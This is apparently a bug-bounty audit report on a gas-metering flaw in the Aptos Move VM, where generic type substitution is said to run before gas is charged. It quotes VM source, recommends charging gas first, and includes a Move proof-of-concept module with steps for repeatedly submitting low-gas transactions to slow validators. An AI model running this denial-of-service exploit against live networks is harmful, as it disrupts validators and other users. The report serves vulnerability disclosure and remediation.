# Audit Report

## Title
Gas Metering Bypass in Type Substitution Operations Allows Computation Without Payment

## Summary
Type substitution operations in the Move VM perform expensive computational work before checking if sufficient gas is available to pay for it. This allows attackers to cause validator nodes to expend CPU resources without corresponding gas payment, enabling a resource exhaustion attack.

## Finding Description
The Move VM charges gas for type substitution operations based on the number of type nodes after instantiation. However, the actual type substitution work is performed **before** the gas charge is applied, creating a window where computation exceeds paid gas.

The vulnerable flow occurs in generic struct operations (PackGeneric, UnpackGeneric, etc.): [1](#0-0) 

When `frame_cache.get_struct_fields_types()` is called, it checks if the type instantiation is cached. If not cached: [2](#0-1) 

The `get_or_insert!` macro evaluates `frame.instantiate_generic_struct_fields(idx)?` which performs the actual type substitution: [3](#0-2) 

This substitution calls `create_ty_with_subst` which traverses and constructs the entire type structure: [4](#0-3) 

During substitution, `apply_subst` performs recursive traversal with memory allocations but only checks type size/depth limits, **not gas availability**: [5](#0-4) 

Only **after** the complete substitution finishes does `num_nodes()` get called on the result, and only **then** is gas charged: [6](#0-5) 

**Attack Scenario:**
1. Attacker creates a Move module with complex generic structs approaching the 128-node type size limit
2. Submits transaction with minimal gas (just above intrinsic minimum)
3. Transaction triggers PackGeneric on complex type
4. VM performs type substitution work (up to 51,200 internal gas units worth for 128 nodes × 400 units/node)
5. After work completes, gas charge is attempted
6. Insufficient gas error is raised, transaction aborts
7. Validator has already spent CPU cycles performing the substitution

This breaks the invariant: **"Move VM Safety: Bytecode execution must respect gas limits"** and **"Resource Limits: All operations must respect gas, storage, and computational limits"**

## Impact Explanation
This vulnerability allows **validator node slowdowns** through unpaid computation, qualifying as **High Severity** per the Aptos bug bounty program. 

An attacker can repeatedly submit transactions that:
- Pay minimal gas fees
- Force expensive type substitutions before gas checks
- Cause validators to expend disproportionate CPU resources
- Create denial-of-service conditions affecting block production rates

With the 128-node type limit, each exploitation can force up to 51,200 gas units worth of work while potentially paying for much less. By crafting modules with many distinct generic instantiations, attackers can amplify this effect across multiple operations in a single transaction.

## Likelihood Explanation
**High likelihood** - This vulnerability is easily exploitable:
- No special privileges required
- Simple to construct malicious Move modules with complex generics
- Transactions can be submitted by anyone
- Caching provides limited protection as attackers can create many unique instantiation indices
- No additional security checks prevent this attack path

The vulnerability has existed since gas metering for type substitution was introduced (feature version 14+). [7](#0-6) 

## Recommendation
Charge gas **before** performing type substitution work. Modify `get_struct_fields_types` and related methods to:

1. Calculate the node count **before** substitution using `num_nodes_in_subst()` (which already exists): [8](#0-7) 

2. Charge gas immediately based on this pre-calculated count
3. Only then perform the actual substitution if gas check succeeds

**Reference the safe implementation** already used for generic function local types: [9](#0-8) 

This approach charges gas at line 199 **before** performing any instantiation work, preventing unpaid computation.

Apply this same pattern to `get_struct_fields_types`, `get_struct_type`, `get_field_type_and_struct_type`, and other similar methods in `frame_type_cache.rs`.

## Proof of Concept

```move
module attacker::exploit {
    // Create a struct with maximum complexity approaching 128-node limit
    struct Complex<T1, T2, T3, T4, T5, T6, T7, T8> {
        f1: vector<vector<T1>>,
        f2: vector<vector<T2>>,
        f3: vector<vector<T3>>,
        f4: vector<vector<T4>>,
        f5: vector<vector<T5>>,
        f6: vector<vector<T6>>,
        f7: vector<vector<T7>>,
        f8: vector<vector<T8>>,
    }

    // Function that triggers expensive type substitution
    public entry fun exploit() {
        // Instantiate with complex type arguments
        let _x = Complex<
            vector<u64>,
            vector<u64>,
            vector<u64>,
            vector<u64>,
            vector<u64>,
            vector<u64>,
            vector<u64>,
            vector<u64>
        > {
            f1: vector[],
            f2: vector[],
            f3: vector[],
            f4: vector[],
            f5: vector[],
            f6: vector[],
            f7: vector[],
            f8: vector[],
        };
    }
}
```

**Exploitation steps:**
1. Publish the above module
2. Submit transaction calling `exploit()` with `max_gas_amount` set to minimum (e.g., just above intrinsic gas)
3. VM performs expensive type substitution for `Complex<vector<u64>, ...>` instantiation
4. After substitution completes, gas charge fails due to insufficient gas
5. Transaction aborts, but validator has already performed computation worth significantly more gas than was paid

Repeat with variations to create multiple distinct struct instantiation indices, amplifying the unpaid computation effect.

### Citations

**File:** third_party/move/move-vm/runtime/src/interpreter.rs (L2338-2366)
```rust
                    Instruction::PackGeneric(si_idx) => {
                        // TODO: Even though the types are not needed for execution, we still
                        //       instantiate them for gas metering.
                        //
                        //       This is a bit wasteful since the newly created types are
                        //       dropped immediately.
                        let field_tys = frame_cache.get_struct_fields_types(*si_idx, self)?;
                        for (_, ty_count) in field_tys {
                            gas_meter.charge_create_ty(*ty_count)?;
                        }

                        let (ty, ty_count) = frame_cache.get_struct_type(*si_idx, self)?;
                        gas_meter.charge_create_ty(ty_count)?;
                        interpreter.ty_depth_checker.check_depth_of_type(
                            gas_meter,
                            traversal_context,
                            ty,
                        )?;
                        let field_count = self.field_instantiation_count(*si_idx);

                        gas_meter.charge_pack(
                            true,
                            interpreter.operand_stack.last_n(field_count as usize)?,
                        )?;
                        let args = interpreter.operand_stack.popn(field_count)?;
                        interpreter
                            .operand_stack
                            .push(Value::struct_(Struct::pack(args)))?;
                    },
```

**File:** third_party/move/move-vm/runtime/src/frame_type_cache.rs (L163-182)
```rust
    pub(crate) fn get_struct_fields_types(
        &mut self,
        idx: StructDefInstantiationIndex,
        frame: &Frame,
    ) -> PartialVMResult<&[(Type, NumTypeNodes)]> {
        Ok(get_or_insert!(
            &mut self.struct_field_type_instantiation,
            idx,
            {
                frame
                    .instantiate_generic_struct_fields(idx)?
                    .into_iter()
                    .map(|ty| {
                        let num_nodes = NumTypeNodes::new(ty.num_nodes() as u64);
                        (ty, num_nodes)
                    })
                    .collect::<Vec<_>>()
            }
        ))
    }
```

**File:** third_party/move/move-vm/runtime/src/frame.rs (L195-203)
```rust
                let local_tys = function.local_tys();
                let mut local_ty_counts = Vec::with_capacity(local_tys.len());
                for ty in local_tys {
                    let cnt = NumTypeNodes::new(ty.num_nodes_in_subst(ty_args)? as u64);
                    gas_meter.charge_create_ty(cnt)?;
                    local_ty_counts.push(cnt);
                }
                cache_borrow.instantiated_local_ty_counts = Some(Rc::from(local_ty_counts));
            }
```

**File:** third_party/move/move-vm/runtime/src/frame.rs (L436-458)
```rust
    pub(crate) fn instantiate_generic_fields(
        &self,
        struct_ty: &Arc<StructType>,
        variant: Option<VariantIndex>,
        instantiation: &[Type],
    ) -> PartialVMResult<Vec<Type>> {
        let instantiation_tys = instantiation
            .iter()
            .map(|inst_ty| {
                self.ty_builder
                    .create_ty_with_subst(inst_ty, self.function.ty_args())
            })
            .collect::<PartialVMResult<Vec<_>>>()?;

        struct_ty
            .fields(variant)?
            .iter()
            .map(|(_, inst_ty)| {
                self.ty_builder
                    .create_ty_with_subst(inst_ty, &instantiation_tys)
            })
            .collect::<PartialVMResult<Vec<_>>>()
    }
```

**File:** third_party/move/move-vm/types/src/loaded_data/runtime_types.rs (L853-913)
```rust
    /// Calculates the number of nodes in the substituted type.
    pub fn num_nodes_in_subst(&self, ty_args: &[Type]) -> PartialVMResult<usize> {
        use Type::*;

        thread_local! {
            static CACHE: RefCell<BTreeMap<usize, usize>> = const { RefCell::new(BTreeMap::new()) };
        }

        CACHE.with(|cache| {
            let mut cache = cache.borrow_mut();
            cache.clear();
            let mut num_nodes_in_arg = |idx: usize| -> PartialVMResult<usize> {
                Ok(match cache.entry(idx) {
                    btree_map::Entry::Occupied(entry) => *entry.into_mut(),
                    btree_map::Entry::Vacant(entry) => {
                        let ty = ty_args.get(idx).ok_or_else(|| {
                            PartialVMError::new(StatusCode::UNKNOWN_INVARIANT_VIOLATION_ERROR)
                                .with_message(format!(
                                "type substitution failed: index out of bounds -- len {} got {}",
                                ty_args.len(),
                                idx
                            ))
                        })?;
                        *entry.insert(ty.num_nodes())
                    },
                })
            };

            let mut n = 0;
            for ty in self.preorder_traversal() {
                match ty {
                    TyParam(idx) => {
                        n += num_nodes_in_arg(*idx as usize)?;
                    },
                    Address
                    | Bool
                    | Signer
                    | U8
                    | U16
                    | U32
                    | U64
                    | U128
                    | U256
                    | I8
                    | I16
                    | I32
                    | I64
                    | I128
                    | I256
                    | Vector(..)
                    | Struct { .. }
                    | Reference(..)
                    | MutableReference(..)
                    | StructInstantiation { .. }
                    | Function { .. } => n += 1,
                }
            }

            Ok(n)
        })
    }
```

**File:** third_party/move/move-vm/types/src/loaded_data/runtime_types.rs (L1187-1192)
```rust
    /// Clones the given type, at the same time instantiating all its type parameters.
    pub fn create_ty_with_subst(&self, ty: &Type, ty_args: &[Type]) -> PartialVMResult<Type> {
        let mut count = 0;
        let check = |c: &mut u64, d: u64| self.check(c, d);
        self.subst_impl(ty, ty_args, &mut count, 1, check)
    }
```

**File:** third_party/move/move-vm/types/src/loaded_data/runtime_types.rs (L1339-1431)
```rust
    fn apply_subst<F, G>(
        ty: &Type,
        subst: F,
        count: &mut u64,
        depth: u64,
        check: G,
    ) -> PartialVMResult<Type>
    where
        F: Fn(u16, &mut u64, u64) -> PartialVMResult<Type> + Copy,
        G: Fn(&mut u64, u64) -> PartialVMResult<()> + Copy,
    {
        use Type::*;

        check(count, depth)?;
        *count += 1;
        Ok(match ty {
            TyParam(idx) => {
                // To avoid double-counting, revert counting the type parameter.
                *count -= 1;
                subst(*idx, count, depth)?
            },

            Bool => Bool,
            U8 => U8,
            U16 => U16,
            U32 => U32,
            U64 => U64,
            U128 => U128,
            U256 => U256,
            I8 => I8,
            I16 => I16,
            I32 => I32,
            I64 => I64,
            I128 => I128,
            I256 => I256,
            Address => Address,
            Signer => Signer,
            Vector(elem_ty) => {
                let elem_ty = Self::apply_subst(elem_ty, subst, count, depth + 1, check)?;
                Vector(TriompheArc::new(elem_ty))
            },
            Reference(inner_ty) => {
                let inner_ty = Self::apply_subst(inner_ty, subst, count, depth + 1, check)?;
                Reference(Box::new(inner_ty))
            },
            MutableReference(inner_ty) => {
                let inner_ty = Self::apply_subst(inner_ty, subst, count, depth + 1, check)?;
                MutableReference(Box::new(inner_ty))
            },
            Struct { idx, ability } => Struct {
                idx: *idx,
                ability: ability.clone(),
            },
            StructInstantiation {
                idx,
                ty_args: non_instantiated_tys,
                ability,
            } => {
                let mut instantiated_tys = vec![];
                for ty in non_instantiated_tys.iter() {
                    let ty = Self::apply_subst(ty, subst, count, depth + 1, check)?;
                    instantiated_tys.push(ty);
                }
                StructInstantiation {
                    idx: *idx,
                    ty_args: TriompheArc::new(instantiated_tys),
                    ability: ability.clone(),
                }
            },
            Function {
                args,
                results,
                abilities,
            } => {
                let subs_elem = |count: &mut u64, ty: &Type| -> PartialVMResult<Type> {
                    Self::apply_subst(ty, subst, count, depth + 1, check)
                };
                let args = args
                    .iter()
                    .map(|ty| subs_elem(count, ty))
                    .collect::<PartialVMResult<Vec<_>>>()?;
                let results = results
                    .iter()
                    .map(|ty| subs_elem(count, ty))
                    .collect::<PartialVMResult<Vec<_>>>()?;
                Function {
                    args,
                    results,
                    abilities: *abilities,
                }
            },
        })
    }
```

**File:** aptos-move/aptos-gas-meter/src/meter.rs (L541-549)
```rust
    fn charge_create_ty(&mut self, num_nodes: NumTypeNodes) -> PartialVMResult<()> {
        if self.feature_version() < 14 {
            return Ok(());
        }

        let cost = SUBST_TY_PER_NODE * num_nodes;

        self.algebra.charge_execution(cost)
    }
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/instr.rs (L166-166)
```rust
        [subst_ty_per_node: InternalGasPerTypeNode, { 14.. => "subst_ty_per_node" }, 400],
```
